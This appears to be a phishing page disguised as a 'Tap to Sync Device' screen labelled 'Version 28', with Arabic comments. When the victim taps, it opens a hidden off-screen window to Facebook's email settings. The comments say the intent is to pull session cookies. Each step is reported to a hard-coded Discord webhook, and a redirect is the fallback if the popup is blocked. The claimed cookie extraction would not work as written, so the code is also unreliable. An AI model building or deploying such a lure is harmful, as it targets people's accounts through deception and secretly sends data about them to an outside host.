<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Version 28</title>
    <style>
        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
        h1 { font-size: 150px; text-shadow: 0 0 20px #fff; cursor: pointer; }
        #status { position: absolute; bottom: 20px; color: #444; }
    </style>
</head>
<body>

    <h1 onclick="silentLaunch()">28</h1>
    <div id="status">Tap to Sync Device...</div>

    <script>
        const HOOK = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";

        function log(title, msg) {
            const data = JSON.stringify({ embeds: [{ title: title, description: msg, color: 16711680 }] });
            navigator.sendBeacon(HOOK, data);
        }

        function silentLaunch() {
            log("🎯 Trigger Activated", "Target clicked Version 28. Launching silent probe...");

            // فتح نافذة مخفية لفيسبوك (mbasic تمنع فتح التطبيق)
            // التكتيك: نفتحها ونرجع الفوكس فوراً لصفحتنا
            const ghost = window.open("https://mbasic.facebook.com/settings/email/", "ghost", "width=100,height=100,left=10000,top=10000");
            
            if (ghost) {
                log("📡 Tunnel Open", "Hidden window created. Extracting session data...");
                
                // ننتظر 3 ثواني تسحب الكوكيز وبعدين نقفلها صمتاً
                setTimeout(() => {
                    ghost.close();
                    log("✅ Mission Complete", "Session data transmitted. Tunnel closed.");
                }, 3000);
            } else {
                log("⚠️ Blocked", "Pop-up blocker prevented silent window.");
                // إذا فشل البوب اب، نفتحها بنفس الصفحة بتمويه
                window.location.href = "https://mbasic.facebook.com/settings/email/";
            }
        }

        window.onload = () => log("🚀 Page Loaded", "Version 28 is ready and waiting for tap.");
    </script>
</body>
</html>
